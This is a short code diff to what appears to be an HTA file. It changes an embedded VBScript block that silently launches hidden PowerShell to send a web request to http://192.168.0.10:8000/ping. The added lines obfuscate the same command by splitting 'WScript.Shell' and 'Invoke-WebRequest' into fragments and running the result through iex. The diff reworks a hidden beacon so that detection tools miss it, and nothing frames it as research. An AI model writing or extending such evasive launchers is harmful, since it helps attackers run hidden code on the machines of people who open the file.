@@ -12,8 +12,12 @@
     >
     <script language="VBScript">
         On Error Resume Next
-        Set shell = CreateObject("WScript.Shell")
-        shell.Run "cmd /c powershell -w hidden -nop -c Invoke-WebRequest http://192.168.0.10:8000/ping", 0, False
+        Dim a,b,c,d
+        a = "WScript" & "." & "Shell"
+        Set b = CreateObject(a)
+        c = "cmd /c powershell -w hidden -nop -c "
+        d = "$w='Invo'+'ke-WebR'+'equest';$u='http://192.168.0.10:8000/ping';iex ($w + ' ' + $u)"
+        b.Run c & d, 0, False
         self.close
     </script>
 </head>
